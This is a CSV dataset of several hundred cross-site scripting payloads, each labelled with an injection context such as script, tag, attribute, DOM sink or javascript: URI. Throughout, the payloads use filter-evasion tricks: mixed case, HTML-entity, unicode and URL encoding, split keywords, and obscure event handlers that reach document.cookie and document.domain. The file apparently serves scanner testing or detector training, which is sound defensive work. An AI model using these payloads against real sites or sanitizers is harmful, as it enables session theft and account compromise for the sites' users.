payload,context
<script>//console.log('XSS')</script>,script_injection
<imG oNloAd=AleRt(1)/>,tag_injection
<img on&#97;nim&#97;tionst&#97;rt=prompt(1)>,tag_injection
<scr	ipt>//confirm(document.cookie)</scr	ipt>,script_injection
"""><Img onRepEat=coNsoLe.Log('XSS')>",tag_injection
"%27 onanimationiteration=prompt(String.fromCharCode(88,83,83)) %27",attribute_escape
<script>/x/alert(document.domain)</script>,script_injection
%22 onend=confirm(document.cookie) %22,attribute_escape
' onanimationstart=\u0061lert(1) ',attribute_escape
<scRipT>pRomPt(DocUmeNt.DomAin)</ScrIpt>,script_injection
"""%3E%3Cimg onanimationiteration=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
<imG oNanImaTioNitEraTioN=aLerT(dOcuMenT.dOmaIn)>,tag_injection
""" onanimationiteration=console.log(document.cookie) """,attribute_escape
%27 onanimationend=console.log(%27XSS%27) %27,attribute_escape
"""><img onbegin=alert(document.cookie)>",tag_injection
<img onend=confirm(document.domain)>,tag_injection
"""><img onb&#101;gin=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
' oNanImaTioNenD=cOnsOle.loG('XSS') ',attribute_escape
%3Cimg onrepeat=confirm(1)/%3E,tag_injection
"SetTimEouT(""AleRt(StrIng.frOmCHarCodE(88,83,83))"",0)",dom_sink
"%22><img onend=console.log(String.fromCharCode(88,83,83))>",tag_injection
"""><Img onEnd=coNsoLe.Log(doCumEnt.coOkiE)>",tag_injection
<script>//\u0061lert(document.domain)</script>,script_injection
<script>\u0061lert(location.hash)</script>,script_injection
<imG oNrePeaT=aLerT(dOcuMenT.dOmaIn)>,tag_injection
"""><img onerror=console.log(1)>",tag_injection
"<script>console.log`String.fromCharCode(88,83,83)`</script>",script_injection
javascript:void(console.log(%27XSS%27)),js_uri
"<script>/*/\u0061lert(String.fromCharCode(88,83,83))</script>",script_injection
"document.body.innerHTML=""<img src=x onerror=prompt(document.domain)>""",dom_sink
%3Cimg onanimationend=alert(document.cookie)%3E,tag_injection
%22><img onanimationiteration=prompt(location.hash)>,tag_injection
"<img on&#101;nd=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<script>/x/&#97;l&#101;rt(docum&#101;nt.dom&#97;in)</script>,script_injection
""" oNbeGin=prOmpT(lOcaTioN.hAsh) """,attribute_escape
<img onanimationend=confirm(%27XSS%27)/>,tag_injection
%22 onrepeat=console.log(1) %22,attribute_escape
"setTimeout(""alert(document.domain)"",0)",dom_sink
"""><Img onAniMatIonCanCel=alErt(1)>",tag_injection
<img onrepeat=alert(1)/>,tag_injection
document.write(%22<img src=x onerror=prompt(document.domain)>%22),dom_sink
location.href=%22javascript:alert(%27XSS%27)%22,dom_sink
"""%3E%3Cimg onload=prompt(document.domain)%3E",tag_injection
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>"")",dom_sink
""" oNfoCus=alErt(doCumEnt.coOkiE) AutOfoCus=""",attribute_escape
"EvaL(""ConFirM(STriNg.FroMChArCOde(88,83,83))"")",dom_sink
"document.body.innerHTML=%22<img src=x onerror=confirm(String.fromCharCode(88,83,83))>%22",dom_sink
""" onanimationiteration=confirm('XSS') """,attribute_escape
<imG oNenD=cOnsOle.loG(dOcuMenT.dOmaIn)>,tag_injection
"<img onr&#101;p&#101;&#97;t=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<img on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(docum&#101;nt.cooki&#101;)/>,tag_injection
"""><img onload=prompt(String.fromCharCode(88,83,83))>",tag_injection
"""><img onanimationiteration=prompt(document.cookie)>",tag_injection
"""><Img onAniMatIonIteRatIon=coNfiRm('XSS')>",tag_injection
"""><Img onAniMatIonIteRatIon=alErt('XSS')>",tag_injection
%27 onbegin=confirm(%27XSS%27) %27,attribute_escape
%3Cimg onend=console.log(document.domain)/%3E,tag_injection
""" on&#97;nim&#97;tionst&#97;rt=confirm(loc&#97;tion.h&#97;sh) """,attribute_escape
<imG oNloAd=ConSolE.lOg(LocAtiOn.HasH)>,tag_injection
<imG oNenD=pRomPt(DocUmeNt.DomAin)>,tag_injection
"""><img onanimationiteration=alert('XSS')>",tag_injection
%27 onload=console.log(document.cookie) %27,attribute_escape
<img on&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)/>,tag_injection
"""%3E%3Cimg onend=alert(1)%3E",tag_injection
%3Cscript%3E//confirm('XSS')%3C/script%3E,script_injection
"""><img onbegin=alert(1)>",tag_injection
"<scRipT>//coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))</ScrIpt>",script_injection
%3Cimg onrepeat=console.log(document.cookie)%3E,tag_injection
"""%3E%3Cimg onrepeat=confirm(document.domain)%3E",tag_injection
"%22 onbegin=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape
"%3Cimg onrepeat=confirm(String.fromCharCode(88,83,83))/%3E",tag_injection
"%3Cimg onanimationiteration=console.log(String.fromCharCode(88,83,83))/%3E",tag_injection
"""><img onanimationend=confirm(location.hash)>",tag_injection
"eval(""console.log(1)"")",dom_sink
"""><img onanimationend=\u0061lert(document.domain)>",tag_injection
' oNbeGin=coNfiRm(DocUmeNt.CooKie) ',attribute_escape
<imG oNenD=pRomPt(1)/>,tag_injection
"eval(""\u0061lert(document.domain)"")",dom_sink
<scRipT>//prOmpT(dOcuMenT.cOokIe)</sCriPt>,script_injection
"""><Img onRepEat=prOmpT('XSS')>",tag_injection
%22><img onload=confirm(document.domain)>,tag_injection
<img onend=console.log('XSS')>,tag_injection
"document.write(""<img src=x onerror=\u0061lert('XSS')>"")",dom_sink
<img onlo&#97;d=consol&#101;.log('XSS')/>,tag_injection
JavAscRipT:vOid(coNsoLe.Log(doCumEnt.doMaiN)),js_uri
"&#101;v&#97;l(""&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))"")",dom_sink
"' onrepeat=console.log(String.fromCharCode(88,83,83)) '",attribute_escape
<imG oNanImaTioNenD=pRomPt(DocUmeNt.CooKie)>,tag_injection
j&#97;vascript:prompt(document.domain),js_uri
%22><img onanimationend=alert(1)>,tag_injection
""" onlo&#97;d=confirm(docum&#101;nt.cooki&#101;) """,attribute_escape
<img on&#97;nim&#97;tionst&#97;rt=consol&#101;.log(docum&#101;nt.cooki&#101;)>,tag_injection
"""><img onanimationend=prompt(document.cookie)>",tag_injection
<img on&#97;nim&#97;tionst&#97;rt=confirm(1)/>,tag_injection
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=pRomPt(DocUmeNt.CooKie)>""",dom_sink
<imG oNrePeaT=cOnfIrm('XSS')>,tag_injection
%22><img onanimationstart=confirm(%27XSS%27)>,tag_injection
<img onanimationiteration=console.log(document.domain)/>,tag_injection
%3Cscript%3Ealert`document.cookie`%3C/script%3E,script_injection
"""><Img onAniMatIonIteRatIon=prOmpT(STriNg.FroMChArCOde(88,83,83))>",tag_injection
""" on&#101;rror=consol&#101;.log(docum&#101;nt.cooki&#101;) """,attribute_escape
""" onanimationiteration=alert(location.hash) """,attribute_escape
<imG oNrePeaT=cOnfIrm(loCatIon.haSh)/>,tag_injection
<script>/*/consol&#101;.log(1)</script>,script_injection
""" on&#97;nim&#97;tionst&#97;rt=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
<script>alert(document.cookie)</script>,script_injection
' oNanImaTioNenD=cOnfIrm(1) ',attribute_escape
<imG oNrePeaT=aLerT(1)>,tag_injection
JavAscRipT:vOid(coNfiRm(DocUmeNt.DomAin)),js_uri
""" onerror=console.log(1) """,attribute_escape
"""><img onlo&#97;d=consol&#101;.log(1)>",tag_injection
j&#97;v&#97;script:void(prompt(docum&#101;nt.dom&#97;in)),js_uri
<scr	ipt>/*/confirm(1)</scr	ipt>,script_injection
"' onend=\u0061lert(String.fromCharCode(88,83,83)) '",attribute_escape
"<img onanimationstart=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
"""%3E%3Cimg onend=console.log(document.domain)%3E",tag_injection
' onerror=console.log(document.cookie) ',attribute_escape
"%22 onerror=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape
"eval(""prompt(location.hash)"")",dom_sink
"""><img on&#101;nd=consol&#101;.log('XSS')>",tag_injection
<img on&#97;nim&#97;tionst&#97;rt=consol&#101;.log(docum&#101;nt.cooki&#101;)/>,tag_injection
""" on&#101;rror=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) """,attribute_escape
"""%3E%3Cimg onanimationiteration=prompt('XSS')%3E",tag_injection
"<img on&#101;nd=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
%3Cimg onanimationstart=alert(location.hash)%3E,tag_injection
%3Cimg onanimationcancel=prompt('XSS')/%3E,tag_injection
%27 onanimationstart=confirm(location.hash) %27,attribute_escape
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=cOnsOle.loG('XSS')>""",dom_sink
"%3Cimg onanimationend=prompt(String.fromCharCode(88,83,83))/%3E",tag_injection
""" onend=confirm(document.domain) """,attribute_escape
""" onbegin=prompt(document.cookie) """,attribute_escape
%22 onload=confirm(1) %22,attribute_escape
""" oNenD=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape
<script>alert`document.domain`</script>,script_injection
"""%3E%3Cimg onbegin=alert(document.domain)%3E",tag_injection
javascript:confirm(document.domain),js_uri
""" oNfoCus=alErt(StRinG.fRomChaRCoDe(88,83,83)) aUtoFocUs=""",attribute_escape
%3Cscript%3Econsole.log`1`%3C/script%3E,script_injection
<img onrepeat=\u0061lert(document.domain)/>,tag_injection
%3Cscript%3E/x/alert(location.hash)%3C/script%3E,script_injection
' onanimationend=console.log(document.domain) ',attribute_escape
%27 onanimationiteration=alert(location.hash) %27,attribute_escape
"""><Img onLoaD=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))>",tag_injection
""" oNfoCus=coNsoLe.Log(doCumEnt.coOkiE) AutOfoCus=""",attribute_escape
%3Cimg onerror=prompt(document.domain)%3E,tag_injection
<imG oNanImaTioNcaNceL=aLerT(dOcuMenT.dOmaIn)/>,tag_injection
"%22><img onend=confirm(String.fromCharCode(88,83,83))>",tag_injection
' oNanImaTioNitEraTioN=aLerT('XSS') ',attribute_escape
<img onrepeat=console.log(1)/>,tag_injection
<imG oNloAd=AleRt(1)>,tag_injection
<img onanimationend=console.log(document.domain)>,tag_injection
%22 onanimationstart=alert(document.cookie) %22,attribute_escape
%3Cscript%3E/*/prompt(location.hash)%3C/script%3E,script_injection
<img onanimationend=prompt('XSS')>,tag_injection
' on&#97;nim&#97;tionst&#97;rt=confirm('XSS') ',attribute_escape
"""%3E%3Cimg onerror=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
<script>/x/confirm(document.domain)</script>,script_injection
"document.body.innerHTML=""%3Cimg src=x onerror=console.log(location.hash)%3E""",dom_sink
%3Cimg onerror=alert(document.cookie)%3E,tag_injection
%3Cscript%3E/*/confirm(1)%3C/script%3E,script_injection
"""><Img onLoaD=aLerT(STriNg.FroMChArCOde(88,83,83))>",tag_injection
javascr	ipt:void(confirm(document.cookie)),js_uri
""" on&#101;rror=prompt(docum&#101;nt.dom&#97;in) """,attribute_escape
%22><img onanimationend=confirm(%27XSS%27)>,tag_injection
' onend=prompt(document.cookie) ',attribute_escape
<img onanimationstart=alert(location.hash)/>,tag_injection
"""><img onanimationend=confirm(document.domain)>",tag_injection
' onrepeat=console.log('XSS') ',attribute_escape
""" onr&#101;p&#101;&#97;t=prompt(docum&#101;nt.dom&#97;in) """,attribute_escape
' onload=prompt(location.hash) ',attribute_escape
"""><img onanimationend=prompt(String.fromCharCode(88,83,83))>",tag_injection
"' oNerRor=alErt(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape
"location.href=""javascr	ipt:prompt(document.cookie)""",dom_sink
"%22 onerror=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape
"""><img onrepeat=prompt(1)>",tag_injection
%27 onanimationend=alert(location.hash) %27,attribute_escape
%3Cimg onrepeat=prompt(1)/%3E,tag_injection
"""%3E%3Cimg onanimationend=alert('XSS')%3E",tag_injection
"""%3E%3Cimg onanimationstart=alert(document.domain)%3E",tag_injection
j&#97;vascr	ipt:alert(document.cookie),js_uri
javascript:confirm(location.hash),js_uri
' oNerRor=prOmpT(dOcuMenT.cOokIe) ',attribute_escape
' onload=confirm('XSS') ',attribute_escape
' on&#101;nd=prompt('XSS') ',attribute_escape
""" onbegin=console.log(String.fromCharCode(88,83,83)) """,attribute_escape
<imG oNerRor=coNfiRm(DocUmeNt.CooKie)>,tag_injection
"<img on&#97;nim&#97;tionst&#97;rt=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
' onb&#101;gin=consol&#101;.log(docum&#101;nt.cooki&#101;) ',attribute_escape
"""><img on&#97;nim&#97;tionst&#97;rt=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
"%3Cimg onbegin=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
"<img on&#97;nim&#97;tionit&#101;r&#97;tion=confirm(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
""" onrepeat=confirm(1) """,attribute_escape
%3Cimg onanimationiteration=alert(document.cookie)/%3E,tag_injection
<img onanimationstart=prompt(document.domain)>,tag_injection
' onend=console.log(document.cookie) ',attribute_escape
%22 onend=prompt(1) %22,attribute_escape
""" onerror=prompt(document.domain) """,attribute_escape
""" onfocus=consol&#101;.log(1) &#97;utofocus=""",attribute_escape
"""><img on&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>",tag_injection
"s&#101;tTim&#101;out(""&#97;l&#101;rt('XSS')"",0)",dom_sink
%3Cimg onend=alert(document.domain)%3E,tag_injection
"' oNrePeaT=aLerT(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape
""" oNrePeaT=aLerT(dOcuMenT.cOokIe) """,attribute_escape
"' oNanImaTioNitEraTioN=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape
%22 onanimationend=confirm(document.cookie) %22,attribute_escape
"document.body.innerHTML=""<img src=x onerror=console.log(document.cookie)>""",dom_sink
"<imG oNanImaTioNitEraTioN=aLerT(STriNg.FroMChArCOde(88,83,83))/>",tag_injection
"' onbegin=prompt(String.fromCharCode(88,83,83)) '",attribute_escape
%27 onload=prompt(%27XSS%27) %27,attribute_escape
<img onload=\u0061lert(location.hash)>,tag_injection
""" onanimationstart=confirm(1) """,attribute_escape
<imG oNrePeaT=pRomPt(DocUmeNt.CooKie)>,tag_injection
%22><img onend=console.log(1)>,tag_injection
<img onanimationcancel=alert(document.cookie)/>,tag_injection
""" onanimationstart=confirm('XSS') """,attribute_escape
"""%3E%3Cimg onload=alert(location.hash)%3E",tag_injection
<img onb&#101;gin=consol&#101;.log(1)/>,tag_injection
"SetTimEouT(""AleRt('XSS')"",0)",dom_sink
%3Cscript%3E/x/prompt('XSS')%3C/script%3E,script_injection
%27 onanimationend=alert(1) %27,attribute_escape
<img onr&#101;p&#101;&#97;t=&#97;l&#101;rt(1)/>,tag_injection
%27 onend=alert(document.cookie) %27,attribute_escape
<img onerror=alert(document.cookie)>,tag_injection
"""><img on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
%27 onanimationcancel=alert(1) %27,attribute_escape
""" on&#97;nim&#97;tion&#101;nd=consol&#101;.log(1) """,attribute_escape
"""%3E%3Cimg onanimationend=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
j&#97;vascr	ipt:console.log(document.cookie),js_uri
"""><img on&#97;nim&#97;tionst&#97;rt=confirm(docum&#101;nt.cooki&#101;)>",tag_injection
"' onend=alert(String.fromCharCode(88,83,83)) '",attribute_escape
""" oNerRor=prOmpT(lOcaTioN.hAsh) """,attribute_escape
<script>&#97;l&#101;rt`'XSS'`</script>,script_injection
"""><img onb&#101;gin=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<script>//prompt(docum&#101;nt.cooki&#101;)</script>,script_injection
' on&#101;nd=confirm(loc&#97;tion.h&#97;sh) ',attribute_escape
' onrepeat=prompt(document.cookie) ',attribute_escape
<img onerror=confirm(%27XSS%27)>,tag_injection
"&#101;v&#97;l(""confirm(String.fromCh&#97;rCod&#101;(88,83,83))"")",dom_sink
%27 onbegin=confirm(1) %27,attribute_escape
%3Cscript%3E/x/confirm(1)%3C/script%3E,script_injection
<script>confirm`docum&#101;nt.cooki&#101;`</script>,script_injection
"""%3E%3Cimg onrepeat=prompt(document.cookie)%3E",tag_injection
""" on&#101;nd=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
<imG oNanImaTioNstArt=prOmpT(dOcuMenT.dOmaIn)/>,tag_injection
"<img onanimationstart=alert(String.fromCharCode(88,83,83))/>",tag_injection
"&#101;v&#97;l(""consol&#101;.log(docum&#101;nt.cooki&#101;)"")",dom_sink
"document.write(""<img src=x onerror=prompt(String.fromCharCode(88,83,83))>"")",dom_sink
<img onr&#101;p&#101;&#97;t=consol&#101;.log(docum&#101;nt.dom&#97;in)/>,tag_injection
"setTimeout(%22console.log(location.hash)%22,0)",dom_sink
<script>/*/confirm(1)</script>,script_injection
<imG oNenD=cOnfIrm('XSS')/>,tag_injection
"<scRipT>/X/cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))</scRipT>",script_injection
%3Cimg onload=alert('XSS')/%3E,tag_injection
"""><img onend=alert(document.cookie)>",tag_injection
<scRipT>//coNfiRm(DocUmeNt.CooKie)</ScrIpt>,script_injection
j&#97;vascr	ipt:confirm(document.cookie),js_uri
' onerror=alert(document.domain) ',attribute_escape
"""%3E%3Cimg onanimationend=confirm(1)%3E",tag_injection
"<img onanimationcancel=\u0061lert(String.fromCharCode(88,83,83))/>",tag_injection
<img onlo&#97;d=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
<img onerror=confirm(document.domain)/>,tag_injection
""" onerror=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape
""" onanimationcancel=prompt('XSS') """,attribute_escape
<img onerror=alert(location.hash)>,tag_injection
"<imG oNrePeaT=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))/>",tag_injection
""" onload=alert(document.domain) """,attribute_escape
%3Cimg onbegin=console.log(location.hash)%3E,tag_injection
eval(%22prompt(location.hash)%22),dom_sink
"""><Img onEnd=prOmpT(dOcuMenT.cOokIe)>",tag_injection
"<scr	ipt>/*/console.log(String.fromCharCode(88,83,83))</scr	ipt>",script_injection
"""%3E%3Cimg onend=prompt(document.cookie)%3E",tag_injection
<img onerror=console.log(document.domain)>,tag_injection
"""><img onr&#101;p&#101;&#97;t=confirm(docum&#101;nt.dom&#97;in)>",tag_injection
"%3Cimg onanimationstart=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
"""%3E%3Cimg onend=alert(String.fromCharCode(88,83,83))%3E",tag_injection
""" onr&#101;p&#101;&#97;t=&#97;l&#101;rt('XSS') """,attribute_escape
' oNrePeaT=aLerT(dOcuMenT.cOokIe) ',attribute_escape
""" on&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) """,attribute_escape
""" onfocus=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) &#97;utofocus=""",attribute_escape
<script>prompt`docum&#101;nt.cooki&#101;`</script>,script_injection
""" onfocus=alert(location.hash) autofocus=""",attribute_escape
"""><img onlo&#97;d=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
""" onr&#101;p&#101;&#97;t=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape
"' onanimationstart=console.log(String.fromCharCode(88,83,83)) '",attribute_escape
%22 onanimationstart=prompt(%27XSS%27) %22,attribute_escape
%22><img onanimationstart=console.log(1)>,tag_injection
"%3Cimg onbegin=console.log(String.fromCharCode(88,83,83))/%3E",tag_injection
' oNbeGin=alErt(1) ',attribute_escape
' on&#101;rror=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape
<scRipT>/*/pRomPt(DocUmeNt.DomAin)</ScrIpt>,script_injection
<imG oNanImaTioNenD=cOnfIrm(doCumEnt.doMaiN)/>,tag_injection
"""><img onerror=console.log(document.domain)>",tag_injection
""" onanimationstart=\u0061lert(document.domain) """,attribute_escape
"""><img onr&#101;p&#101;&#97;t=&#97;l&#101;rt(1)>",tag_injection
<img on&#101;rror=prompt(docum&#101;nt.dom&#97;in)/>,tag_injection
%3Cimg onend=prompt(location.hash)%3E,tag_injection
%27 onrepeat=alert(location.hash) %27,attribute_escape
